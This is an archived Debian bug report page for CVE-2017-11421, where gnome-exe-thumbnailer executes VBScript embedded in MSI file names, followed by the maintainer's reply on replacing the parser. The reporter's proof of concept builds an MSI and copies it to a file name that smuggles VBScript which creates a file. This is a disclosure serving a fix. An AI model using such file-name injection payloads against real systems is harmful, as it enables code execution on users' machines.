<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<link rel="icon" href="/favicon.png">
<title>#868705 - gnome-exe-thumbnailer: CVE-2017-11421: Thumbnail generation for MSI files executes arbitrary VBScript - Debian Bug report logs</title>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="/css/bugs.css" type="text/css">

<link rel="canonical" href="&lt;a href=&quot;bugreport.cgi?bug=868705&quot;&gt;868705&lt;/a&gt;">
<script type="text/javascript">
<!--
function toggle_infmessages()
{
        allDivs=document.getElementsByTagName("div");
        for (var i = 0 ; i < allDivs.length ; i++ )
        {
                if (allDivs[i].className == "infmessage")
                {
                        allDivs[i].style.display=(allDivs[i].style.display == 'none' | allDivs[i].style.display == '') ? 'block' : 'none';
                }
        }
}
-->
</script>
</head>
<body>
<h1>Debian Bug report logs - 
<a href="mailto:868705@bugs.debian.org">#868705</a><br>
gnome-exe-thumbnailer: CVE-2017-11421: Thumbnail generation for MSI files executes arbitrary VBScript</h1>
<div class="versiongraph"><a href="version.cgi?absolute=0;found=gnome-exe-thumbnailer%2F0.9.4-2;fixed=gnome-exe-thumbnailer%2F0.9.5-1;fixed=gnome-exe-thumbnailer%2F0.9.4-2%2Bdeb9u1;info=1;package=gnome-exe-thumbnailer;collapse=1"><img alt="version graph" src="version.cgi?package=gnome-exe-thumbnailer;collapse=1;absolute=0;width=2;fixed=gnome-exe-thumbnailer%2F0.9.5-1;fixed=gnome-exe-thumbnailer%2F0.9.4-2%2Bdeb9u1;found=gnome-exe-thumbnailer%2F0.9.4-2;height=2"></a></div>
<div class="pkginfo">
  <p>Package:
     <a class="submitter" href="pkgreport.cgi?package=gnome-exe-thumbnailer">gnome-exe-thumbnailer</a>;
Maintainer for <a href="pkgreport.cgi?package=gnome-exe-thumbnailer">gnome-exe-thumbnailer</a> is <a href="pkgreport.cgi?maint=debian-wine%40lists.debian.org">Debian Wine Team &lt;debian-wine@lists.debian.org&gt;</a>; Source for <a href="pkgreport.cgi?package=gnome-exe-thumbnailer">gnome-exe-thumbnailer</a> is <a href="pkgreport.cgi?src=exe-thumbnailer">src:exe-thumbnailer</a> (<a href="https://tracker.debian.org/pkg/exe-thumbnailer">PTS</a>, <a href="https://buildd.debian.org/exe-thumbnailer">buildd</a>, <a href="https://qa.debian.org/popcon.php?package=exe-thumbnailer">popcon</a>). </p>

</div>

<div class="buginfo">
  <p>Reported by: <a href="pkgreport.cgi?submitter=nils%2Bdebian-reportbug%40dieweltistgarnichtso.net">Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;</a></p>
  <p>Date: Mon, 17 Jul 2017 21:03:02 UTC</p>

<p>Severity: <em class="severity">grave</em></p>
<p>Tags: buster, fixed-upstream, security, sid, stretch</p>

<p>Found in version gnome-exe-thumbnailer/0.9.4-2</p>
<p>Fixed in versions gnome-exe-thumbnailer/0.9.5-1, gnome-exe-thumbnailer/0.9.4-2+deb9u1</p>

<p><strong>Done:</strong> James Lu &lt;bitflip3@gmail.com&gt;</p>

<p>Bug is archived. No further changes may be made.<p></div>

<p><a href="javascript:toggle_infmessages();">Toggle useless messages</a></p><div class="msgreceived"><p>View this report as an <a href="bugreport.cgi?bug=868705;mbox=yes">mbox folder</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;mboxstatus=yes">status mbox</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;mboxmaint=yes">maintainer mbox</a></p></div>

<div class="infmessage"><hr><p>
<a name="1"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, nils+debian-reportbug@dieweltistgarnichtso.net, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500325384 -->
<strong>Report forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, nils+debian-reportbug@dieweltistgarnichtso.net, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Mon, 17 Jul 2017 21:03:04 GMT) (<a href="bugreport.cgi?bug=868705;msg=2">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=2">mbox</a>, <a href="#1">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="3"></a>
<!-- request_addr: Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt; -->
<!-- time:1500325384 -->
<strong>Acknowledgement sent</strong>
to <code>Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;</code>:<br>
New Bug report received and forwarded.  Copy sent to <code>nils+debian-reportbug@dieweltistgarnichtso.net, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Mon, 17 Jul 2017 21:03:04 GMT) (<a href="bugreport.cgi?bug=868705;msg=4">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=4">mbox</a>, <a href="#3">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="5"></a><a name="msg5"></a><a href="#5">Message #5</a> received at submit@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=5">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=5">mbox</a>, <a href="mailto:868705@bugs.debian.org?body=On%20Mon%2C%2017%20Jul%202017%2023%3A01%3A42%20%2B0200%20Nils%20Dagsson%20Moskopp%20%3Cnils%2Bdebian-reportbug%40dieweltistgarnichtso.net%3E%20wrote%3A%0A%3E%20Package%3A%20gnome-exe-thumbnailer%0A%3E%20Version%3A%200.9.4-2%0A%3E%20Severity%3A%20grave%0A%3E%20Tags%3A%20security%0A%3E%20Justification%3A%20user%20security%20hole%0A%3E%20%0A%3E%20Dear%20Maintainer%2C%0A%3E%20%0A%3E%20the%20following%20PoC%20is%20copied%20verbatim%20from%20my%20post%20about%20the%20parsing%20issue%3A%0A%3E%20http%3A%2F%2Fnews.dieweltistgarnichtso.net%2Fposts%2Fgnome-thumbnailer-msi-fail.html%0A%3E%20%0A%3E%20Proof%20of%20Concept%0A%3E%20%0A%3E%20Install%20Dependencies%0A%3E%20%0A%3E%20On%20Debian%20GNU%2FLinux%2C%20install%20the%20packages%20gnome-exe-thumbnailer%2C%20nautilus%20and%20wixl.%20The%20wixl%20package%20is%20only%20needed%20to%20create%20MSI%20files%20that%20trigger%20the%20thumbnailer.%0A%3E%20%0A%3E%20If%20the%20proof%20of%20concept%20does%20not%20work%2C%20install%20winetricks%20and%20run%20winetricks%20wsh56%20to%20upgrade%20the%20Windows%20Script%20Host.%0A%3E%20%0A%3E%20Create%20MSI%20Files%0A%3E%20%0A%3E%20Create%20a%20file%20named%20poc.xml%20with%20the%20following%20content%3A%0A%3E%20%0A%3E%20%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3E%20%3CWix%20xmlns%3D%22http%3A%2F%2Fschemas.microsoft.com%2Fwix%2F2006%2Fwi%22%3E%0A%3E%20%3CProduct%20Version%3D%221.0%22%2F%3E%0A%3E%20%3C%2FWix%3E%0A%3E%20%0A%3E%20Execute%20the%20following%20Bourne%20Shell%20code%3A%0A%3E%20%0A%3E%20wixl%20-o%20poc.msi%20poc.xml%0A%3E%20cp%20poc.msi%20%22poc.msi%5C%22%2C0%29%3ASet%20fso%3DCreateObject%28%5C%22Scripting.FileSystemObject%5C%22%29%3ASet%20poc%3Dfso.CreateTextFile%28%5C%22badtaste.txt%5C%22%29%27.msi%22%0A%3E%20%0A%3E%20Trigger%20Execution%0A%3E%20%0A%3E%20Start%20GNOME%20Files%20and%20navigate%20to%20the%20folder%20with%20the%20MSI%20files.%20An%20empty%20file%20with%20the%20name%20badtaste.txt%20should%20appear.%0A%3E%20%0A%3E%20%2A%2A%2A%20End%20of%20the%20template%20-%20remove%20these%20template%20lines%20%2A%2A%2A%0A%3E%20%0A%3E%20%0A%3E%20--%20System%20Information%3A%0A%3E%20Debian%20Release%3A%209.0%0A%3E%20%20%20APT%20prefers%20stable%0A%3E%20%20%20APT%20policy%3A%20%28500%2C%20%27stable%27%29%0A%3E%20Architecture%3A%20i386%20%28i686%29%0A%3E%20%0A%3E%20Kernel%3A%20Linux%203.16.0-4-686-pae%20%28SMP%20w%2F1%20CPU%20core%29%0A%3E%20Locale%3A%20LANG%3Dde_DE.UTF-8%2C%20LC_CTYPE%3Dde_DE.UTF-8%20%28charmap%3DUTF-8%29%0A%3E%20Shell%3A%20%2Fbin%2Fsh%20linked%20to%20%2Fbin%2Fdash%0A%3E%20Init%3A%20sysvinit%20%28via%20%2Fsbin%2Finit%29%0A%3E%20%0A%3E%20Versions%20of%20packages%20gnome-exe-thumbnailer%20depends%20on%3A%0A%3E%20ii%20%20icoutils%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%200.31.2-1.1%0A%3E%20ii%20%20imagemagick%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%208%3A6.9.7.4%2Bdfsg-11%0A%3E%20ii%20%20imagemagick-6.q16%20%5Bimagemagick%5D%20%208%3A6.9.7.4%2Bdfsg-11%0A%3E%20ii%20%20libglib2.0-bin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%202.50.3-2%0A%3E%20%0A%3E%20Versions%20of%20packages%20gnome-exe-thumbnailer%20recommends%3A%0A%3E%20pn%20%20wine%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cnone%3E%0A%3E%20pn%20%20wine64-tools%20%7C%20wine32-tools%20%7C%20wine64-development-tools%20%7C%20wine32-dev%20%20%3Cnone%3E%0A&amp;subject=Re%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%20generation%20for%20MSI%20files%20executes%20arbitrary%0A%20VBScript&amp;References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E&amp;In-Reply-To=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=nils%2Bdebian-reportbug%40dieweltistgarnichtso.net" alt="">
<div class="header"><span class="headerfield">From:</span> Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;</div>
<div class="header"><span class="headerfield">To:</span> Debian Bug Tracking System &lt;submit@bugs.debian.org&gt;</div>
<div class="header"><span class="headerfield">Subject:</span> gnome-exe-thumbnailer: Thumbnail generation for MSI files executes arbitrary
 VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Mon, 17 Jul 2017 23:01:42 +0200</div>
</div>
<pre class="message">Package: gnome-exe-thumbnailer
Version: 0.9.4-2
Severity: grave
Tags: security
Justification: user security hole

Dear Maintainer,

the following PoC is copied verbatim from my post about the parsing issue:
<a href="http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html">http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html</a>

Proof of Concept

Install Dependencies

On Debian GNU/Linux, install the packages gnome-exe-thumbnailer, nautilus and wixl. The wixl package is only needed to create MSI files that trigger the thumbnailer.

If the proof of concept does not work, install winetricks and run winetricks wsh56 to upgrade the Windows Script Host.

Create MSI Files

Create a file named poc.xml with the following content:

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;Wix xmlns=&quot;<a href="http://schemas.microsoft.com/wix/2006/wi&quot;">http://schemas.microsoft.com/wix/2006/wi&quot;</a>&gt;
&lt;Product Version=&quot;1.0&quot;/&gt;
&lt;/Wix&gt;

Execute the following Bourne Shell code:

wixl -o poc.msi poc.xml
cp poc.msi &quot;poc.msi\&quot;,0):Set fso=CreateObject(\&quot;Scripting.FileSystemObject\&quot;):Set poc=fso.CreateTextFile(\&quot;badtaste.txt\&quot;)&#39;.msi&quot;

Trigger Execution

Start GNOME Files and navigate to the folder with the MSI files. An empty file with the name badtaste.txt should appear.

*** End of the template - remove these template lines ***


-- System Information:
Debian Release: 9.0
  APT prefers stable
  APT policy: (500, &#39;stable&#39;)
Architecture: i386 (i686)

Kernel: Linux 3.16.0-4-686-pae (SMP w/1 CPU core)
Locale: LANG=de_DE.UTF-8, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8)
Shell: /bin/sh linked to /bin/dash
Init: sysvinit (via /sbin/init)

Versions of packages gnome-exe-thumbnailer depends on:
ii  icoutils                         0.31.2-1.1
ii  imagemagick                      8:6.9.7.4+dfsg-11
ii  imagemagick-6.q16 [imagemagick]  8:6.9.7.4+dfsg-11
ii  libglib2.0-bin                   2.50.3-2

Versions of packages gnome-exe-thumbnailer recommends:
pn  wine                                                                 &lt;none&gt;
pn  wine64-tools | wine32-tools | wine64-development-tools | wine32-dev  &lt;none&gt;

gnome-exe-thumbnailer suggests no packages.

-- no debconf information


</pre>

<div class="infmessage"><hr><p>
<a name="6"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500336367 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Tue, 18 Jul 2017 00:06:07 GMT) (<a href="bugreport.cgi?bug=868705;msg=7">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=7">mbox</a>, <a href="#6">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="8"></a>
<!-- request_addr: James Lu &lt;bitflip3@gmail.com&gt; -->
<!-- time:1500336367 -->
<strong>Acknowledgement sent</strong>
to <code>James Lu &lt;bitflip3@gmail.com&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Tue, 18 Jul 2017 00:06:07 GMT) (<a href="bugreport.cgi?bug=868705;msg=9">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=9">mbox</a>, <a href="#8">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="10"></a><a name="msg10"></a><a href="#10">Message #10</a> received at 868705@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=10">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=10">mbox</a>, <a href="mailto:868705@bugs.debian.org?References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E%0A%20%3C8b0c01b0-607e-559d-f261-fd29ad271eed%40gmail.com%3E&amp;subject=Re%3A%20%5Bpkg-wine-party%5D%20Bug%23868705%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%0A%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript&amp;body=On%20Tue%2C%2018%20Jul%202017%2008%3A03%3A27%20%2B0800%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20wrote%3A%0A%3E%20Hi%20Nils%2C%0A%3E%20%0A%3E%20I%20wasn%27t%20able%20to%20reproduce%20the%20exploit%20on%20my%20%2864-bit%29%20system%20with%20either%0A%3E%20Caja%20and%20Nautilus%20%28it%20also%20required%20setting%20up%20a%20new%20wineprefix%20in%0A%3E%20~%2F.wine%29.%20The%20msi%20thumbnail%20ended%20up%20generating%20without%20any%20version%0A%3E%20information%20tag%20at%20all.%0A%3E%20%0A%3E%20Regardless%2C%20I%27ve%20gone%20and%20replaced%20the%20VBScript-based%20parsing%20entirely%0A%3E%20with%20msitools%27%20msiinfo%20in%0A%3E%20https%3A%2F%2Fgithub.com%2Fgnome-exe-thumbnailer%2Fgnome-exe-thumbnailer%2Fcommit%2F1d8e3102dd8fd23431ae6127d14a236da6b4a4a5%3B%0A%3E%20hopefully%20this%20should%20fix%20the%20issue.%20I%27ll%20tag%20a%20new%20release%20soon%20and%0A%3E%20look%20at%20pushing%20the%20fix%20to%20Debian.%0A%3E%20%0A%3E%20%28Also%20CC%27ing%20the%20other%20maintainers%2C%20who%20I%20don%27t%20think%20are%20on%20the%20Debian%0A%3E%20Wine%20list%29%0A%3E%20%0A%3E%20Best%2C%0A%3E%20James%0A%3E%20%0A%3E%20On%2018%2F07%2F17%2005%3A01%20AM%2C%20Nils%20Dagsson%20Moskopp%20wrote%3A%0A%3E%20%3E%20Package%3A%20gnome-exe-thumbnailer%0A%3E%20%3E%20Version%3A%200.9.4-2%0A%3E%20%3E%20Severity%3A%20grave%0A%3E%20%3E%20Tags%3A%20security%0A%3E%20%3E%20Justification%3A%20user%20security%20hole%0A%3E%20%3E%20%0A%3E%20%3E%20Dear%20Maintainer%2C%0A%3E%20%3E%20%0A%3E%20%3E%20the%20following%20PoC%20is%20copied%20verbatim%20from%20my%20post%20about%20the%20parsing%20issue%3A%0A%3E%20%3E%20http%3A%2F%2Fnews.dieweltistgarnichtso.net%2Fposts%2Fgnome-thumbnailer-msi-fail.html%0A%3E%20%3E%20%0A%3E%20%3E%20Proof%20of%20Concept%0A%3E%20%3E%20%0A%3E%20%3E%20Install%20Dependencies%0A%3E%20%3E%20%0A%3E%20%3E%20On%20Debian%20GNU%2FLinux%2C%20install%20the%20packages%20gnome-exe-thumbnailer%2C%20nautilus%20and%20wixl.%20The%20wixl%20package%20is%20only%20needed%20to%20create%20MSI%20files%20that%20trigger%20the%20thumbnailer.%0A%3E%20%3E%20%0A%3E%20%3E%20If%20the%20proof%20of%20concept%20does%20not%20work%2C%20install%20winetricks%20and%20run%20winetricks%20wsh56%20to%20upgrade%20the%20Windows%20Script%20Host.%0A%3E%20%3E%20%0A%3E%20%3E%20Create%20MSI%20Files%0A%3E%20%3E%20%0A%3E%20%3E%20Create%20a%20file%20named%20poc.xml%20with%20the%20following%20content%3A%0A%3E%20%3E%20%0A%3E%20%3E%20%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3E%20%3E%20%3CWix%20xmlns%3D%22http%3A%2F%2Fschemas.microsoft.com%2Fwix%2F2006%2Fwi%22%3E%0A%3E%20%3E%20%3CProduct%20Version%3D%221.0%22%2F%3E%0A%3E%20%3E%20%3C%2FWix%3E%0A%3E%20%3E%20%0A%3E%20%3E%20Execute%20the%20following%20Bourne%20Shell%20code%3A%0A%3E%20%3E%20%0A%3E%20%3E%20wixl%20-o%20poc.msi%20poc.xml%0A%3E%20%3E%20cp%20poc.msi%20%22poc.msi%5C%22%2C0%29%3ASet%20fso%3DCreateObject%28%5C%22Scripting.FileSystemObject%5C%22%29%3ASet%20poc%3Dfso.CreateTextFile%28%5C%22badtaste.txt%5C%22%29%27.msi%22%0A%3E%20%3E%20%0A%3E%20%3E%20Trigger%20Execution%0A%3E%20%3E%20%0A%3E%20%3E%20Start%20GNOME%20Files%20and%20navigate%20to%20the%20folder%20with%20the%20MSI%20files.%20An%20empty%20file%20with%20the%20name%20badtaste.txt%20should%20appear.%0A%3E%20%3E%20%0A%3E%20%3E%20%2A%2A%2A%20End%20of%20the%20template%20-%20remove%20these%20template%20lines%20%2A%2A%2A%0A%3E%20%3E%20%0A%3E%20%3E%20%0A&amp;In-Reply-To=%3C8b0c01b0-607e-559d-f261-fd29ad271eed%40gmail.com%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=bitflip3%40gmail.com" alt="">
<div class="header"><span class="headerfield">From:</span> James Lu &lt;bitflip3@gmail.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;,
 868705@bugs.debian.org</div>
<div class="header"><span class="headerfield">Cc:</span> Scott Ritchie &lt;scottritchie@ubuntu.com&gt;, Jan Nekvasil &lt;jan@nekvasil.cz&gt;</div>
<div class="header"><span class="headerfield">Subject:</span> Re: [pkg-wine-party] Bug#868705: gnome-exe-thumbnailer: Thumbnail
 generation for MSI files executes arbitrary VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 08:03:27 +0800</div>
</div>
<pre class="mime">[<a href="bugreport.cgi?att=0;bug=868705;msg=10">Message part 1</a> (text/plain, inline)]</pre>
<pre class="message">Hi Nils,

I wasn&#39;t able to reproduce the exploit on my (64-bit) system with either
Caja and Nautilus (it also required setting up a new wineprefix in
~/.wine). The msi thumbnail ended up generating without any version
information tag at all.

Regardless, I&#39;ve gone and replaced the VBScript-based parsing entirely
with msitools&#39; msiinfo in
<a href="https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5;">https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5;</a>
hopefully this should fix the issue. I&#39;ll tag a new release soon and
look at pushing the fix to Debian.

(Also CC&#39;ing the other maintainers, who I don&#39;t think are on the Debian
Wine list)

Best,
James

On 18/07/17 05:01 AM, Nils Dagsson Moskopp wrote:
&gt; Package: gnome-exe-thumbnailer
&gt; Version: 0.9.4-2
&gt; Severity: grave
&gt; Tags: security
&gt; Justification: user security hole
&gt; 
&gt; Dear Maintainer,
&gt; 
&gt; the following PoC is copied verbatim from my post about the parsing issue:
&gt; <a href="http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html">http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html</a>
&gt; 
&gt; Proof of Concept
&gt; 
&gt; Install Dependencies
&gt; 
&gt; On Debian GNU/Linux, install the packages gnome-exe-thumbnailer, nautilus and wixl. The wixl package is only needed to create MSI files that trigger the thumbnailer.
&gt; 
&gt; If the proof of concept does not work, install winetricks and run winetricks wsh56 to upgrade the Windows Script Host.
&gt; 
&gt; Create MSI Files
&gt; 
&gt; Create a file named poc.xml with the following content:
&gt; 
&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&gt; &lt;Wix xmlns=&quot;<a href="http://schemas.microsoft.com/wix/2006/wi&quot;">http://schemas.microsoft.com/wix/2006/wi&quot;</a>&gt;
&gt; &lt;Product Version=&quot;1.0&quot;/&gt;
&gt; &lt;/Wix&gt;
&gt; 
&gt; Execute the following Bourne Shell code:
&gt; 
&gt; wixl -o poc.msi poc.xml
&gt; cp poc.msi &quot;poc.msi\&quot;,0):Set fso=CreateObject(\&quot;Scripting.FileSystemObject\&quot;):Set poc=fso.CreateTextFile(\&quot;badtaste.txt\&quot;)&#39;.msi&quot;
&gt; 
&gt; Trigger Execution
&gt; 
&gt; Start GNOME Files and navigate to the folder with the MSI files. An empty file with the name badtaste.txt should appear.
&gt; 
&gt; *** End of the template - remove these template lines ***
&gt; 
&gt; 
&gt; -- System Information:
&gt; Debian Release: 9.0
&gt;   APT prefers stable
&gt;   APT policy: (500, &#39;stable&#39;)
&gt; Architecture: i386 (i686)
&gt; 
&gt; Kernel: Linux 3.16.0-4-686-pae (SMP w/1 CPU core)
&gt; Locale: LANG=de_DE.UTF-8, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8)
&gt; Shell: /bin/sh linked to /bin/dash
&gt; Init: sysvinit (via /sbin/init)
&gt; 
&gt; Versions of packages gnome-exe-thumbnailer depends on:
&gt; ii  icoutils                         0.31.2-1.1
&gt; ii  imagemagick                      8:6.9.7.4+dfsg-11
&gt; ii  imagemagick-6.q16 [imagemagick]  8:6.9.7.4+dfsg-11
&gt; ii  libglib2.0-bin                   2.50.3-2
&gt; 
&gt; Versions of packages gnome-exe-thumbnailer recommends:
&gt; pn  wine                                                                 &lt;none&gt;
&gt; pn  wine64-tools | wine32-tools | wine64-development-tools | wine32-dev  &lt;none&gt;
&gt; 
&gt; gnome-exe-thumbnailer suggests no packages.
&gt; 
&gt; -- no debconf information
&gt; 
&gt; _______________________________________________
&gt; pkg-wine-party mailing list
&gt; pkg-wine-party@lists.alioth.debian.org
&gt; <a href="http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-wine-party">http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-wine-party</a>
&gt; 

</pre>
<pre class="mime">[<a href="bugreport.cgi?att=1;bug=868705;filename=signature.asc;msg=10">signature.asc</a> (application/pgp-signature, attachment)]</pre>

<div class="infmessage"><hr><p>
<a name="11"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500340323 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Tue, 18 Jul 2017 01:12:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=12">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=12">mbox</a>, <a href="#11">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="13"></a>
<!-- request_addr: Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt; -->
<!-- time:1500340323 -->
<strong>Acknowledgement sent</strong>
to <code>Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Tue, 18 Jul 2017 01:12:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=14">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=14">mbox</a>, <a href="#13">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="15"></a><a name="msg15"></a><a href="#15">Message #15</a> received at 868705@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=15">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=15">mbox</a>, <a href="mailto:868705@bugs.debian.org?body=On%20Tue%2C%2018%20Jul%202017%2003%3A02%3A04%20%2B0200%20Nils%20Dagsson%20Moskopp%20%3Cnils%40dieweltistgarnichtso.net%3E%20wrote%3A%0A%3E%20I%20like%20that%20the%20patch%20is%20less%20code.%20Deleted%20code%20is%20debugged%20code%21%0A%3E%20Btw%2C%20are%20you%20sure%20that%20using%20mssiinfo%20does%20not%20introduce%20new%20bugs%3F%0A%3E%20%0A%3E%20Cheers%2C%0A%3E%20Nils%0A%3E%20%0A%3E%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20writes%3A%0A%3E%20%0A%3E%20%3E%20%5B%20Unknown%20signature%20status%20%5D%0A%3E%20%3E%20Hi%20Nils%2C%0A%3E%20%3E%0A%3E%20%3E%20I%20wasn%27t%20able%20to%20reproduce%20the%20exploit%20on%20my%20%2864-bit%29%20system%20with%20either%0A%3E%20%3E%20Caja%20and%20Nautilus%20%28it%20also%20required%20setting%20up%20a%20new%20wineprefix%20in%0A%3E%20%3E%20~%2F.wine%29.%20The%20msi%20thumbnail%20ended%20up%20generating%20without%20any%20version%0A%3E%20%3E%20information%20tag%20at%20all.%0A%3E%20%3E%0A%3E%20%3E%20Regardless%2C%20I%27ve%20gone%20and%20replaced%20the%20VBScript-based%20parsing%20entirely%0A%3E%20%3E%20with%20msitools%27%20msiinfo%20in%0A%3E%20%3E%20https%3A%2F%2Fgithub.com%2Fgnome-exe-thumbnailer%2Fgnome-exe-thumbnailer%2Fcommit%2F1d8e3102dd8fd23431ae6127d14a236da6b4a4a5%3B%0A%3E%20%3E%20hopefully%20this%20should%20fix%20the%20issue.%20I%27ll%20tag%20a%20new%20release%20soon%20and%0A%3E%20%3E%20look%20at%20pushing%20the%20fix%20to%20Debian.%0A%3E%20%3E%0A%3E%20%3E%20%28Also%20CC%27ing%20the%20other%20maintainers%2C%20who%20I%20don%27t%20think%20are%20on%20the%20Debian%0A%3E%20%3E%20Wine%20list%29%0A%3E%20%3E%0A%3E%20%3E%20Best%2C%0A%3E%20%3E%20James%0A%3E%20%3E%0A%3E%20%3E%20On%2018%2F07%2F17%2005%3A01%20AM%2C%20Nils%20Dagsson%20Moskopp%20wrote%3A%0A%3E%20%3E%3E%20Package%3A%20gnome-exe-thumbnailer%0A%3E%20%3E%3E%20Version%3A%200.9.4-2%0A%3E%20%3E%3E%20Severity%3A%20grave%0A%3E%20%3E%3E%20Tags%3A%20security%0A%3E%20%3E%3E%20Justification%3A%20user%20security%20hole%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20Dear%20Maintainer%2C%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20the%20following%20PoC%20is%20copied%20verbatim%20from%20my%20post%20about%20the%20parsing%20issue%3A%0A%3E%20%3E%3E%20http%3A%2F%2Fnews.dieweltistgarnichtso.net%2Fposts%2Fgnome-thumbnailer-msi-fail.html%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20Proof%20of%20Concept%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20Install%20Dependencies%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20On%20Debian%20GNU%2FLinux%2C%20install%20the%20packages%20gnome-exe-thumbnailer%2C%20nautilus%20and%20wixl.%20The%20wixl%20package%20is%20only%20needed%20to%20create%20MSI%20files%20that%20trigger%20the%20thumbnailer.%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20If%20the%20proof%20of%20co